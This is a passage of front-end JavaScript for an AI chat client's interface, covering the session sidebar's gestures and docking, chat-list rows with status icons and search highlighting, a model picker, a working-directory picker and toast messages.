  setRailFiledAway(true);
  hideRail();
}

function hideRail() {
  const active = document.activeElement;
  if (active && active.closest("#session-rail")) active.blur();
  document.body.classList.remove("rail-open", "rail-dragging");
  clearRailDragStyles();
  syncRailToggle();
  snapViewportSoon();
}

function toggleSessionRail() {
  if (!railIsOpen()) openSessionRail("");
  else if (railDocked()) fileRailAway();
  else closeSessionRail();
}

// The half of the toggle's state that CSS cannot express: what the control is
// CALLED right now, and whether a screen reader is told it is pressed. The
// glyph, the fill and the tint all derive from `body.rail-open` in the
// stylesheet, so this adds no second opinion about which state is painted — it
// only names it. Docked, the name is what the tap will DO (Hide/Show), because
// there the button is a switch whose position you can see; as a slide-over it
// stays "Chats", because there it opens a list and nothing is toggling.
function syncRailToggle() {
  const chip = $("back-chip");
  if (!chip) return;
  const docked = railDocked();
  const showing = railIsOpen();
  const label = !docked ? "Chats" : showing ? "Hide chats" : "Show chats";
  chip.title = label;
  chip.setAttribute("aria-label", label);
  // aria-pressed only where the control IS a switch. On a phone it opens an
  // overlay that the scrim and a swipe also close, so announcing a pressed
  // state would describe a toggle the user does not have.
  if (docked) chip.setAttribute("aria-pressed", showing ? "true" : "false");
  else chip.removeAttribute("aria-pressed");
}

function clearRailDragStyles() {
  $("session-rail").style.transform = "";
  $("rail-scrim").style.opacity = "";
}

// The finger-following half of the edge gesture (see [RAILSWIPE]). The panel is
// laid out off-screen by CSS and dragged in with an inline transform; the class
// takes over again the moment the finger lifts, so no drag can leave the rail
// resting somewhere the stylesheet doesn't know about.
function beginRailDrag() {
  if (railDocked()) return;
  document.body.classList.add("rail-dragging");
  requestSessions($("sessions-search").value || "");
}

function dragRailTo(progress) {
  if (!document.body.classList.contains("rail-dragging")) return;
  $("session-rail").style.transform = `translateX(${-(1 - progress) * railWidth()}px)`;
  $("rail-scrim").style.opacity = String(progress);
}

function endRailDrag(open) {
  document.body.classList.remove("rail-dragging");
  clearRailDragStyles();
  if (open) openSessionRail("");
  else closeSessionRail();
}

// The scrim IS a dismiss target — the sliver of chat you can still see is what
// says the rail is temporary, and tapping it is what makes that true.
$("rail-scrim").onclick = () => closeSessionRail();

// …and so is a leftward drag on the panel itself: the exact inverse of the
// gesture that opened it, which is the first thing a hand reaches for to push
// something back off the screen. It is available because rows no longer own a
// horizontal gesture — the swipe-to-delete they used to carry meant this very
// drag deleted a chat instead, which is both surprising and the destructive
// reading of an ambiguous gesture.
(function attachRailCloseSwipe() {
  const rail = $("session-rail");
  let sx = 0, sy = 0, tracking = false, claimed = false;
  rail.addEventListener("touchstart", (event) => {
    tracking = false;
    if (event.touches.length !== 1 || railDocked() || !railIsOpen()) return;
    sx = event.touches[0].clientX;
    sy = event.touches[0].clientY;
    tracking = true;
    claimed = false;
  }, { passive: true });

  rail.addEventListener("touchmove", (event) => {
    if (!tracking) return;
    const dx = event.touches[0].clientX - sx;
    const dy = event.touches[0].clientY - sy;
    if (!claimed) {
      if (Math.abs(dx) < RAIL_AXIS_AT && Math.abs(dy) < RAIL_AXIS_AT) return;
      // The list scrolls vertically; a scroll must never drag the panel.
      if (dx >= 0 || Math.abs(dx) < Math.abs(dy) * 1.4) { tracking = false; return; }
      claimed = true;
      document.body.classList.add("rail-dragging");
    }
    // Dragging TOWARD closed: progress runs 1 → 0.
    dragRailTo(Math.max(0, Math.min(1, 1 + dx / railWidth())));
  }, { passive: true });

  const finish = (event) => {
    if (!tracking) return;
    tracking = false;
    if (!claimed) return;
    claimed = false;
    const touch = event.changedTouches[0];
    const dx = touch ? touch.clientX - sx : 0;
    // Past a third of the way back, let go of it; otherwise settle open again.
    endRailDrag(dx > -railWidth() * RAIL_COMMIT_AT);
  };
  rail.addEventListener("touchend", finish);
  rail.addEventListener("touchcancel", finish);
})();

// Docking is a viewport fact, so it is re-read on resize. Both directions
// matter: growing past the breakpoint must not leave a docked layout inset for
// a panel that isn't shown, and shrinking below it must not strand a rail that
// was never deliberately opened sitting over the chat.
addEventListener("resize", () => {
  if (railDocked()) {
    // Growing past the breakpoint restores what the owner last chose here, not
    // an unconditional open: a sidebar they filed away must stay away across a
    // window resize, or every drag of the window edge undoes the decision.
    const show = !railFiledAway();
    if (show !== railIsOpen()) {
      document.body.classList.toggle("rail-open", show);
      if (show) requestSessions($("sessions-search").value || "");
    }
    // Crossing the breakpoint changes what the control IS, not just its state,
    // so the wording is re-derived even when nothing opened or closed.
    syncRailToggle();
    return;
  }
  document.body.classList.remove("rail-open", "rail-dragging");
  clearRailDragStyles();
  syncRailToggle();
});

// At a docked width the rail starts open unless it was filed away. Only the
// CLASS is set here — filling it is left to the first hello, because this runs
// at module load, before the offline layer the list paints from is ready.
if (railDocked() && !railFiledAway()) document.body.classList.add("rail-open");
syncRailToggle();
// [RAIL-END]

// Only the states the user can act on. "idle but open in server memory" is
// an implementation detail — resume behaves identically either way.
const STATE_BADGES = {
  running: ["Running", "st-running"],
  waiting: ["Needs approval", "st-waiting"],
};

const DAY_MS = 86400000;
function dayStart(stamp) {
  const day = new Date(stamp);
  day.setHours(0, 0, 0, 0);
  return +day;
}

function sessionGroup(ts) {
  const now = Date.now();
  const ms = ts * 1000;
  if (now - ms < 8 * 3600 * 1000) return "Recent";
  const today = dayStart(now);
  const day = dayStart(ms);
  if (day >= today) return "Today";
  if (day >= today - DAY_MS) return "Yesterday";
  if (day >= today - 7 * DAY_MS) return "Previous 7 days";
  return "Older";
}

// Within the last hour, show relative time ("just now", "2m") — for something
// touched minutes ago an absolute clock reading forces mental arithmetic.
// Older entries fall back to a 24h absolute time (never AM/PM), gaining a
// weekday past midnight and a date past a week.
function sessionStamp(ts) {
  const ms = ts * 1000;
  const now = Date.now();
  const delta = now - ms;
  if (delta < 60 * 1000) return "just now";
  if (delta < 3600 * 1000) return `${Math.floor(delta / 60000)}m`;
  const date = new Date(ms);
  const time = date.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", hour12: false });
  const today = dayStart(now);
  const day = dayStart(date);
  if (day >= today) return time;
  if (day >= today - 6 * DAY_MS)
    return `${date.toLocaleDateString([], { weekday: "short" })} ${time}`;
  return `${date.toLocaleDateString([], { day: "numeric", month: "short" })}, ${time}`;
}

// The row icon answers ONE question: what is the state of this chat? It used to
// answer two badly — a blue tick for "this is the chat you're in" (which the
// row's own highlight already says, and which read as "done"), and a provenance
// glyph only when nothing else was showing, so a screen of ordinary chats was a
// screen of identical grey icons. Now: attention states win, then provenance,
// then a plain chat mark — and "current" is not an icon at all.
const SESSION_ICONS = {
  waiting: `<svg viewBox="0 0 24 24"><path d="M12 3.5 21 19H3z" fill="none" stroke="var(--orange)" stroke-width="1.8" stroke-linejoin="round"/><path d="M12 10v3.6M12 16.4v.1" stroke="var(--orange)" stroke-width="1.9" stroke-linecap="round"/></svg>`,
  chat: `<svg viewBox="0 0 24 24"><path d="M4 6.5a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H9l-4 3.2V16.5a2 2 0 0 1-1-1.7z" fill="none" stroke="var(--dim)" stroke-width="1.7" stroke-linejoin="round"/></svg>`,
  schedule: `<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="8" fill="none" stroke="var(--purple, #a78bfa)" stroke-width="1.8"/><path d="M12 7.4V12l3 1.8" fill="none" stroke="var(--purple, #a78bfa)" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>`,
  email: `<svg viewBox="0 0 24 24"><rect x="3.5" y="5.5" width="17" height="13" rx="2.5" fill="none" stroke="var(--purple, #a78bfa)" stroke-width="1.8"/><path d="M4.5 8l7.5 5 7.5-5" fill="none" stroke="var(--purple, #a78bfa)" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>`,
  webhook: `<svg viewBox="0 0 24 24"><path d="M13 4.5 6.5 13H12l-1 6.5L17.5 11H12z" fill="none" stroke="var(--purple, #a78bfa)" stroke-width="1.8" stroke-linejoin="round"/></svg>`,
};

const ORIGIN_LABELS = { email: "started by email", schedule: "scheduled", webhook: "started by a webhook" };

function sessionIcon(info) {
  const wrap = document.createElement("span");
  wrap.className = "row-icon";
  const auto = info.origin && info.origin !== "user" ? info.origin : "";
  if (info.state === "running") {
    wrap.className += " ic-running";
    wrap.innerHTML = '<span class="spin"></span>';
    wrap.title = "working";
  } else if (info.state === "waiting") {
    wrap.className += " ic-waiting";
    wrap.innerHTML = SESSION_ICONS.waiting;
    wrap.title = "needs your approval";
  } else if (auto) {
    // An unrecognised origin still reads as automation rather than as a chat.
    wrap.className += " ic-auto";
    wrap.innerHTML = SESSION_ICONS[auto] || SESSION_ICONS.webhook;
    wrap.title = ORIGIN_LABELS[auto] || `started by ${auto}`;
  } else {
    wrap.className += " ic-chat";
    wrap.innerHTML = SESSION_ICONS.chat;
  }
  return wrap;
}

// [SEARCH-HIGHLIGHT-START]
// Paint the searched words inside a row's own text. A quote you have to re-read
// to find the word you typed is barely better than no quote (#266) — and on a
// phone the row is one truncated line, so the match has to be findable at a
// glance or it is not there at all. Text nodes and one element per hit: the
// text is a chat's contents and never becomes markup.
function paintMatch(el, text, words) {
  el.textContent = "";
  const lower = (text || "").toLowerCase();
  let at = 0;
  while (at < text.length) {
    let hit = -1;
    let len = 0;
    for (const word of words) {
      const found = word ? lower.indexOf(word, at) : -1;
      if (found >= 0 && (hit < 0 || found < hit || (found === hit && word.length > len))) {
        hit = found;
        len = word.length;
      }
    }
    if (hit < 0) break;
    if (hit > at) el.appendChild(document.createTextNode(text.slice(at, hit)));
    const mark = document.createElement("mark");
    mark.textContent = text.slice(hit, hit + len);
    el.appendChild(mark);
    at = hit + len;
  }
  if (at < text.length) el.appendChild(document.createTextNode(text.slice(at)));
}
// [SEARCH-HIGHLIGHT-END]

function sessionRow(info, current, opts = {}) {
  const isCurrent = info.name === current;
  const row = document.createElement("button");
  row.className = "row session-row" + (isCurrent ? " current" : "");
  if (opts.unread) row.classList.add("unread");
  const body = document.createElement("span");
  body.className = "session-body";
  const head = document.createElement("span");
  head.className = "line";
  const title = document.createElement("span");
  title.className = "title";
  if (opts.match && opts.match.length) paintMatch(title, info.title, opts.match);
  else title.textContent = info.title;
  head.appendChild(title);
  const badgeSpec = STATE_BADGES[info.state];
  if (badgeSpec) {
    const badge = document.createElement("span");
    badge.className = `badge ${badgeSpec[1]}`;
    badge.textContent = badgeSpec[0];
    head.appendChild(badge);
  }
  body.appendChild(head);
  if (info.cwd) {
    const dir = document.createElement("span");
    dir.className = "session-dir mono";
    dir.innerHTML = '<svg viewBox="0 0 24 24"><path d="M3.5 6.8a2 2 0 0 1 2-2h3.4l2 2.2h7.6a2 2 0 0 1 2 2v8.2a2 2 0 0 1-2 2h-13a2 2 0 0 1-2-2z" fill="none" stroke="currentColor" stroke-width="1.8"/></svg>';
    dir.appendChild(document.createTextNode(abbreviatePath(info.cwd)));
    body.appendChild(dir);
  }
  if (info.snippet) {
    const snippet = document.createElement("span");
    snippet.className = "snippet";
    if (opts.match && opts.match.length) paintMatch(snippet, info.snippet, opts.match);
    else snippet.textContent = info.snippet;
    body.appendChild(snippet);
  }
  const right = document.createElement("span");
  right.className = "session-right";
  const stampLine = document.createElement("span");
  stampLine.className = "stamp-line";
  const stamp = document.createElement("span");
  stamp.className = "stamp";
  stamp.textContent = sessionStamp(info.ts);
  stampLine.append(stamp);
  // Pinned is ONE concept (#165's offline pin absorbed it): a pinned chat sits
  // in its own band at the top AND is never evicted from the offline mirror.
  // It goes BELOW the stamp, in the space the row's trash control used to take,
  // rather than beside it — stacked in the corner, the two of them were eating
  // the title's width for a mark that is decoration next to the title itself.
  right.append(stampLine);
  if (info.pinned) {
    const pin = document.createElement("span");
    pin.className = "row-pin";
    pin.title = "pinned — kept at the top and available offline";
    pin.innerHTML = PIN_SVG;
    right.append(pin);
  }
  // Unread is a BADGE on the status icon, not a column of its own. A leading
  // slot is the mail convention, but mail rows are wide and these are not: an
  // always-reserved 12px gutter on a phone-width panel spent real title space
  // on a state most rows do not have. Cornering it on the icon costs nothing,
  // is the notification-dot convention, and still reads at a glance.
  const icon = sessionIcon(info);
  if (opts.unread) {
    const dot = document.createElement("span");
    dot.className = "unread-dot";
    dot.setAttribute("aria-label", "unread");
    icon.appendChild(dot);
  }
  row.append(icon, body, right);
  return railRow(row, info);
}

// A pushpin standing UPRIGHT and solid — pinned. The tilted, hollow version of
// the same shape means "not pinned" and only appears in the chat menu, where
// both states exist; a row only ever shows the pinned one. Upright-vs-tilted is
// the distinction to keep: a pin lying at an angle reads as one not pushed in,
// which is why the first version (tilted AND blue) read backwards.
const PIN_SVG =
  '<svg viewBox="0 0 24 24"><path d="M16 12V4h1V2H7v2h1v8l-2 2v2h5.2v6h1.6v-6H18v-2z" fill="currentColor"/></svg>';

// A rail row is just a row now. It used to ride over a red Delete button on a
// left-swipe, and that gesture had to go: leftward on this panel is the natural
// way to push it back off screen, and having the same drag mean "delete this
// chat" instead was both surprising and the more destructive reading of an
// ambiguous gesture. Deleting lives in the chat menu, which is where a rare,
// irreversible action belongs — and where it already was.
function railRow(row, info) {
  row.dataset.name = info.name; // so the "you are here" mark can move in place
  row.onclick = () => {
    resumeSession(info.name); // the socket if there is one, else the mirror
    closeSessionRail();
  };
  return row;
}

// Which chat you are in is a LOCAL fact — the client moves on the tap and the
// server's `current` only catches up a round trip later. On a docked rail that
// showed as the row you just tapped staying plain while the row you LEFT went
// on claiming to be current, which is the same "your tap wasn't heard" the
// transcript used to say. Repainted in place rather than by re-rendering the
// list: the list's CONTENT is still the server's to supply.
function refreshRailCurrent() {
  for (const row of document.querySelectorAll("#sessions-list .session-row")) {
    row.classList.toggle("current", row.dataset.name === currentSession);
  }
}

// ---- rendering the list --------------------------------------------------
function railSection(label, sessions, current, unreadState) {
  if (!sessions.length) return;
  const list = $("sessions-list");
  list.appendChild(sectionLabel(label));
  for (const info of sessions) {
    list.appendChild(sessionRow(info, current, { unread: sessionUnread(info, unreadState) }));
  }
}

function renderSessions(event) {
  lastSessionEvent = event;
  // Carry the mirror's own facts onto server-supplied rows: the pin lives on
  // this device, so the authoritative list only learns it from here.
  if (!event.fromCache) {
    for (const info of event.sessions) {
      const meta = offlineMeta.get(info.name);
      if (meta) info.pinned = meta.pinned;
    }
  }
  const list = $("sessions-list");
  list.replaceChildren();
  // "Which chat am I in" is the CLIENT's fact: it moves on the tap, while the
  // server's `current` reflects the last resume it has processed. Preferring
  // the server's here would undo refreshRailCurrent on the very next list that
  // arrives — and a list arrives right after every switch.
  const current = currentSession || event.current;
  const unreadState = { seen: seenAt, since: seenSince, current };
  const query = $("sessions-search").value.trim();
  const searching = Boolean(query);
  const match = query.toLowerCase().split(/\s+/).filter(Boolean);
  // The badge's ground truth, claimed only by an UNFILTERED SERVER list: a
  // cached list cannot see liveness at all and a ranked search result is a
  // subset of the chats there are, so either would silently under-count
  // ([ATTENTION]).
  if (!event.fromCache && !searching) {
    setAttentionRows(event.sessions);
    rosterSnapshotLanded(event.seq); // the stream alone suffices from here ([ROSTER])
  }
  // Ranked search results are ordered by relevance, so date/band grouping would
  // lie about why a row is where it is. Render a flat list.
  if (searching) {
    if (!event.sessions.length) { list.textContent = "no matching chats"; return; }
    // These rows do NOT contain what was typed — they are the nearest chats to a
    // query nothing matched (#266). Unlabelled, the honest answer to a typo is
    // indistinguishable from the search being broken, which is the complaint
    // this whole change came from.
    if (event.approx) list.appendChild(sectionLabel("No exact match — closest chats"));
    for (const info of event.sessions) {
      list.appendChild(
        sessionRow(info, current, { unread: sessionUnread(info, unreadState), match })
      );
    }
    return;
  }
  if (!event.sessions.length) {
    const empty = document.createElement("div");
    empty.className = "section-label";
    empty.textContent = "No chats yet";
    list.appendChild(empty);
    return;
  }
  const { bands } = partitionSessions(event.sessions, unreadState);
  railSection("Needs you", bands.needsYou, current, unreadState);
  railSection("Active now", bands.active, current, unreadState);
  railSection("Pinned", bands.pinned, current, unreadState);
  let lastGroup = null;
  for (const info of bands.rest) {
    const group = sessionGroup(info.ts);
    if (group !== lastGroup) {
      list.appendChild(sectionLabel(group));
      lastGroup = group;
    }
    list.appendChild(sessionRow(info, current, { unread: false }));
  }
}

// models
$("model-chip").onclick = () => openModelSheet("");
$("model-search").addEventListener(
  "input",
  debounce(() => send({ type: "models", query: $("model-search").value }), 150)
);

function openModelSheet(query) {
  openSheet("model-sheet");
  $("model-search").value = query;
  $("model-search").focus();
  $("model-list").textContent = "loading models…";
  send({ type: "models", query });
}

const RECENT_MODELS_KEY = "aish-recent-models";
function recentModels() {
  try {
    const parsed = JSON.parse(localStorage.getItem(RECENT_MODELS_KEY));
    return Array.isArray(parsed) ? parsed : [];
  } catch { return []; }
}
function rememberModel(name) {
  const list = [name, ...recentModels().filter((n) => n !== name)].slice(0, 5);
  localStorage.setItem(RECENT_MODELS_KEY, JSON.stringify(list));
}

function renderModels(event) {
  const list = $("model-list");
  list.replaceChildren();
  const modelRow = (model) => {
    const isCurrent = model.name === event.current;
    const row = document.createElement("button");
    row.className = "row" + (isCurrent ? " current" : "");
    row.textContent = model.name;
    const meta = document.createElement("span");
    meta.className = "meta";
    meta.textContent = model.desc;
    row.appendChild(meta);
    if (isCurrent) {
      // A trailing checkmark on the active model (#121) — instant clarity on
      // top of the subtle .current row tint; the iOS "selected row" convention.
      const check = document.createElement("span");
      check.className = "row-check";
      check.innerHTML = '<svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
      row.appendChild(check);
    }
    row.onclick = () => {
      rememberModel(model.name);
      act({ type: "set_model", spec: model.name, save: $("model-save").checked },
        { label: "the model switch" });
    };
    return row;
  };
  // Browsing (no search): surface recently-chosen models up top.
  if (!$("model-search").value.trim()) {
    const recents = recentModels()
      .filter((n) => n !== event.current && event.models.some((m) => m.name === n));
    if (recents.length) {
      list.appendChild(sectionLabel("Recent"));
      for (const n of recents) list.appendChild(modelRow(event.models.find((m) => m.name === n)));
      list.appendChild(sectionLabel("All models"));
    }
  }
  for (const model of event.models) list.appendChild(modelRow(model));
}

function onModelChanged(event) {
  $("model-name").textContent = event.model;
  closeSheets();
  showToast(event.saved ? `model: ${event.model} (saved as default)` : `model: ${event.model}`);
}

// workspace
$("ws-cd-change").onclick = () => openDirSheet();
$("root-add").onclick = () => {
  const path = $("root-input").value.trim();
  if (path) { act({ type: "add_dir", path }, { label: "adding that directory" }); $("root-input").value = ""; }
};
$("jobs-refresh").onclick = () => send({ type: "jobs" });

attachListNav($("sessions-search"), $("sessions-list"));
attachListNav($("model-search"), $("model-list"));

function renderWorkspace(event) {
  if (event.home) homeDir = event.home;
  if (event.cwd) {
    currentCwd = event.cwd;
    $("ws-cwd").textContent = event.cwd;
    $("cwd-name").textContent = baseName(event.cwd);
    $("cwd-text").textContent = abbreviatePath(event.cwd);
    refreshCmdPrompt(); // keep the terminal prompt's `dir $` in sync after cd
  }
  if (event.roots) $("ws-roots").textContent = event.roots.join("\n");
}

// ---- cwd chip + directory picker -----------------------------------------
let homeDir = "";
let currentCwd = "";

function abbreviatePath(path) {
  let p = path;
  if (homeDir && (p === homeDir || p.startsWith(homeDir + "/"))) {
    p = "~" + p.slice(homeDir.length);
  }
  // middle-free truncation keeping the leaf — the informative part
  return p.length > 38 ? "…" + p.slice(-37) : p;
}

// The directory's leaf name — the context bar's bold primary line.
function baseName(path) {
  const leaf = path.replace(/\/+$/, "").split("/").pop();
  return leaf || path;
}

const RECENT_DIRS_KEY = "aish-recent-dirs";
function recentDirs() {
  try {
    const parsed = JSON.parse(localStorage.getItem(RECENT_DIRS_KEY));
    return Array.isArray(parsed) ? parsed : [];
  } catch { return []; }
}
function rememberDir(path) {
  const list = [path, ...recentDirs().filter((p) => p !== path)].slice(0, 6);
  localStorage.setItem(RECENT_DIRS_KEY, JSON.stringify(list));
}
// Drop a path from the recents list only — never touches the actual folder (#89).
function forgetDir(path) {
  localStorage.setItem(
    RECENT_DIRS_KEY, JSON.stringify(recentDirs().filter((p) => p !== path))
  );
}

let dirPath = "";       // directory the picker is browsing
let dirEntries = [];    // its subdirectories, as {name, items}
let dirFiles = [];      // its files (display only, non-navigable)
let dirTruncated = false; // listing hit the cap (huge folder)

async function dirsFetch(url, params) {
  if (token) params.set("token", token);
  const response = await fetch(`${BASE}${url.replace(/^\//, "")}?${params}`);
  const body = await response.json().catch(() => ({}));
  if (!response.ok) throw new Error(body.error || response.status);
  return body;
}

async function browseDir(path, row = null) {
  $("dir-sheet").classList.add("browsing");
  // A browse can take up to the backend's timeout (iCloud/slow dirs). Show the
  // spinner on the tapped row when there is one (#87), else the centered overlay
  // (crumb/back/"choose another folder" have no row to mark).
  if (row) row.classList.add("loading");
  else setDirLoading(true);
  let body;
  try {
    body = await dirsFetch("/dirs", new URLSearchParams({ path }));
  } catch (err) {
    if (row) row.classList.remove("loading");
    else setDirLoading(false);
    renderDirUnlistable(path, err.message);
    return;
  }
  // A successful browse re-renders the list (below), discarding the marked row.
  setDirLoading(false);
  dirPath = body.path;
  dirEntries = body.dirs;
  dirFiles = body.files || [];
  dirTruncated = body.truncated || false;
  renderDirList();
}

function setDirLoading(on) {
  $("dir-list").classList.toggle("loading", on);
}

// A folder we couldn't list — the backend timed out reading it (an iCloud or
// networked folder the headless server can't materialize). We can't show its
// contents, but SELECTING it as the working dir doesn't need a listing (cd only
// stats the path), so keep it reachable via ".." and the "Use this folder"
// button, which still targets this path.
function renderDirUnlistable(path, msg) {
  dirPath = path;
  $("dir-sheet").classList.add("browsing");
  $("dir-current").textContent = abbreviatePath(path);
  $("dir-use-label").textContent = `Set working directory to “${baseName(path)}”`;
  renderDirCrumb();
  const list = $("dir-list");
  list.replaceChildren();
  if (dirPath !== "/") {
    list.appendChild(
      dirRow("..", null, (e) => browseDir(dirPath.replace(/\/[^/]+$/, "") || "/", e.currentTarget), "up")
    );
  }
  const note = document.createElement("div");
  note.className = "dir-empty";
  note.textContent =
    `Couldn't open this folder (${msg}) — it may be an iCloud or network folder ` +
    `the server can't read. You can still set it as the working directory below.`;
  list.appendChild(note);
}

// Step 1 of the picker: recent folders + "Choose another folder…" → the
// browser. Recents SELECT the directory directly; matches the design flow.
function showDirRecents() {
  $("dir-sheet").classList.remove("browsing");
  const list = $("dir-list");
  list.replaceChildren();
  const recents = recentDirs();
  if (recents.length) {
    list.appendChild(sectionLabel("Recent"));
    for (const p of recents) {
      const row = dirRow(baseName(p), abbreviatePath(p), () => selectDir(p), "recent");
      row.querySelector(".dir-chev").remove(); // a selection, not a descent
      if (p === currentCwd) row.classList.add("selected");
      // "Remove from Recents" ✕ — clears the history entry, NOT the folder (#89).
      const remove = document.createElement("span");
      remove.className = "dir-remove";
      remove.setAttribute("role", "button");
      remove.tabIndex = 0;
      remove.title = "Remove from Recents";
      remove.setAttribute("aria-label", `Remove ${baseName(p)} from Recents`);
      remove.innerHTML =
        '<svg viewBox="0 0 24 24"><path d="M7 7l10 10M17 7L7 17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>';
      const doRemove = (e) => { e.stopPropagation(); forgetDir(p); showDirRecents(); };
      remove.addEventListener("click", doRemove);
      remove.addEventListener("keydown", (e) => {
        if (e.key === "Enter" || e.key === " ") doRemove(e);
      });
      row.appendChild(remove);
      list.appendChild(row);
    }
  }
  const choose = document.createElement("button");
  choose.type = "button";
  choose.className = "dir-choose";
  choose.innerHTML =
    '<svg viewBox="0 0 24 24"><path d="M3.5 6.8a2 2 0 0 1 2-2h3.4l2 2.2h7.6a2 2 0 0 1 2 2v8.2a2 2 0 0 1-2 2h-13a2 2 0 0 1-2-2z" fill="none" stroke="currentColor" stroke-width="1.8"/><path d="M12 10v5M9.5 12.5h5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>Choose another folder…';
  choose.onclick = () => browseDir(currentCwd || homeDir || "/");
  list.appendChild(choose);
}

function selectDir(path) {
  rememberDir(path);
  // Closing the sheet reads as acceptance, and a cd moves the APPROVAL ROOT —
  // the one piece of state where a silent no-op is a safety question, not a
  // papercut. The chip still only moves on the server's own cwd_changed.
  act({ type: "cd", path }, { label: "the directory change" });
  closeSheets();
}

const DIR_ICON_FOLDER = '<svg class="dir-ico" viewBox="0 0 24 24"><path d="M3.5 6.8a2 2 0 0 1 2-2h3.4l2 2.2h7.6a2 2 0 0 1 2 2v8.2a2 2 0 0 1-2 2h-13a2 2 0 0 1-2-2z" fill="var(--folder-fill)" stroke="var(--blue)" stroke-width="1.6"/></svg>';
const DIR_ICON_UP = '<svg class="dir-ico" viewBox="0 0 24 24"><path d="M14.5 5.5 8 12l6.5 6.5" fill="none" stroke="var(--blue)" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round"/></svg>';
const DIR_ICON_FILE = '<svg class="dir-ico" viewBox="0 0 24 24"><path d="M6.5 3.8h7l4 4v11.4a1 1 0 0 1-1 1h-10a1 1 0 0 1-1-1V4.8a1 1 0 0 1 1-1z" fill="none" stroke="var(--dim)" stroke-width="1.6" stroke-linejoin="round"/><path d="M13.2 3.8v4h4" fill="none" stroke="var(--dim)" stroke-width="1.6" stroke-linejoin="round"/></svg>';
const DIR_CHEVRON = '<svg class="dir-chev" viewBox="0 0 24 24"><path d="M9 6l6 6-6 6" fill="none" stroke="var(--sep2)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';

function dirRow(label, meta, onTap, kind = "folder") {
  const row = document.createElement("button");
  row.type = "button";
  row.className = "row dir-row" + (kind === "up" ? " up" : "") + (kind === "file" ? " file" : "");
  row.innerHTML = kind === "up" ? DIR_ICON_UP : kind === "file" ? DIR_ICON_FILE : DIR_ICON_FOLDER;
  const name = document.createElement("span");
  name.className = "folder";
  name.textContent = label;
  row.appendChild(name);
  if (meta) {
    const metaEl = document.createElement("span");
    metaEl.className = "meta";
    metaEl.textContent = meta;
    row.appendChild(metaEl);
  }
  if (kind === "folder" || kind === "recent") row.insertAdjacentHTML("beforeend", DIR_CHEVRON);
  if (kind === "file") row.disabled = true; // display only — not a destination
  else row.onclick = onTap;
  return row;
}

function sectionLabel(text) {
  const el = document.createElement("div");
  el.className = "section-label";
  el.textContent = text;
  return el;
}

// A tappable full-path breadcrumb at the top so you always know where you are
// and can jump back up quickly (#13).
function renderDirCrumb() {
  const crumb = $("dir-crumb");
  crumb.replaceChildren();
  const isHome = homeDir && (dirPath === homeDir || dirPath.startsWith(homeDir + "/"));
  const rel = (isHome ? dirPath.slice(homeDir.length) : dirPath).replace(/^\/+/, "");
  const segs = rel ? rel.split("/") : [];
  const seg = (label, path, last) => {
    const el = document.createElement(last ? "span" : "button");
    el.className = "crumb-seg" + (last ? " current" : "");
    el.textContent = label;
    if (!last) el.onclick = () => browseDir(path);
    crumb.appendChild(el);
  };
  seg(isHome ? "~" : "/", isHome ? homeDir : "/", segs.length === 0);
  let acc = isHome ? homeDir : "";
  segs.forEach((s, i) => {
    // The "/" root already reads as a separator, so skip it before the first
    // segment of an absolute path (avoids a leading "/ /").
    if (!(i === 0 && !isHome)) {
      const sep = document.createElement("span");
      sep.className = "crumb-sep";
      sep.textContent = "/";
      crumb.appendChild(sep);
    }
    acc = acc + "/" + s;
    seg(s, acc, i === segs.length - 1);
  });
}

function renderDirList() {
  $("dir-current").textContent = abbreviatePath(dirPath);
  $("dir-use-label").textContent = `Set working directory to “${baseName(dirPath)}”`;
  renderDirCrumb();
  const list = $("dir-list");
  list.replaceChildren();

  if (dirPath !== "/") {
    list.appendChild(
      dirRow("..", null, (e) => browseDir(dirPath.replace(/\/[^/]+$/, "") || "/", e.currentTarget), "up")
    );
  }
  const visible = dirEntries.filter(({ name }) => !name.startsWith("."));
  for (const { name, items } of visible) {
    // items may be null (symlink, unreadable, or counting budget spent) — show no count then.
    const meta = items == null ? null : items === 1 ? "1 item" : `${items} items`;
    list.appendChild(
      dirRow(name, meta, (e) =>
        browseDir(dirPath === "/" ? `/${name}` : `${dirPath}/${name}`, e.currentTarget))
    );
  }

  // Files are shown dimmed and non-navigable (distinguished by icon/dimming, no
  // header — #93) so the picker previews a folder's contents without becoming a
  // file browser.
  const visibleFiles = dirFiles.filter((n) => !n.startsWith("."));
  for (const name of visibleFiles) list.appendChild(dirRow(name, null, null, "file"));
  if (dirTruncated) {
    const note = document.createElement("div");
    note.className = "dir-empty";
    note.textContent = "Showing the first 1000 entries.";
    list.appendChild(note);
  }
}

function openDirSheet() {
  openSheet("dir-sheet");
  dirPath = currentCwd || homeDir || "/";
  showDirRecents(); // step 1: recents + "Choose another folder…"
}

$("cwd-chip").onclick = () => openDirSheet();
$("dir-back").onclick = () => showDirRecents(); // back to step 1 (recents) from browsing
$("dir-use").onclick = () => {
  if (!dirPath) return;
  rememberDir(dirPath);
  act({ type: "cd", path: dirPath }, { label: "the directory change" });
  closeSheets();
};
// toast
let toastTimer;
// sticky keeps the toast up until the next showToast/hideToast — used for
// in-progress feedback (e.g. a slow PDF export) that a later call resolves.
function showToast(text, sticky = false) {
  const toast = $("toast");
  toast.textContent = text;
  toast.hidden = false;
  clearTimeout(toastTimer);
  if (!sticky) toastTimer = setTimeout(() => { toast.hidden = true; }, 3500);
}

function hideToast() {
  clearTimeout(toastTimer);
  $("toast").hidden = true;
}

// Copy to the clipboard with a toast, falling back to an execCommand copy off a
// hidden textarea when the async Clipboard API is unavailable (older WKWebView /
// non-secure context). Always shows the text so it's grabbable even if both fail.
function copyToClipboard(text, label = "copied") {
  const done = () => showToast(`${label}: ${text}`);
  const fallback = () => {
    const ta = document.createElement("textarea");
    ta.value = text;
    ta.style.position = "fixed";
    ta.style.opacity = "0";
    document.body.appendChild(ta);
    ta.select();
    try { document.execCommand("copy"); } catch { /* nothing more to try */ }
    ta.remove();
